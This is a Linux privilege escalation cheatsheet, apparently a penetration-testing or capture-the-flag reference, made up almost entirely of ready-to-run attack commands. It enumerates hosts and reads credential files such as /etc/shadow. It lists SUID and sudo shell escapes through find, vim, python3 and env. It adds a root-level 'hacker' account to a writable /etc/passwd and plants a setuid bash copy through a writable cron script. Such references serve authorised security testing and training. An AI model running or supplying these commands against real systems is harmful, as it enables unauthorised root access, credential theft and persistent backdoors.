# Linux Privilege Escalation Cheatsheet

## Quick Wins

```bash
# Check sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd

# Kernel exploits
uname -a
cat /etc/os-release
```

## Enumeration

```bash
# System info
hostname
uname -a
cat /etc/*-release

# Users
cat /etc/passwd
cat /etc/shadow  # if readable
cat /etc/group

# Network
ip a
netstat -tlnp
ss -tlnp

# Running processes
ps auxww
pspy  # monitor processes

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Installed software
dpkg -l
rpm -qa
```

## Common Exploits

### SUID Binaries (GTFOBins)

```bash
# Find SUID
find / -perm -4000 2>/dev/null

# Common exploits
/usr/bin/find . -exec /bin/sh -p \;
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Sudo Exploits

```bash
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \;

# (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/sh
```

### Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Add root user
echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

### Cron Jobs

```bash
# Writable script in cron
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Wait for cron, then:
/tmp/bash -p
```

## Tools

```bash
# Automated enumeration
./linpeas.sh
./LinEnum.sh
./linux-exploit-suggester.sh
```
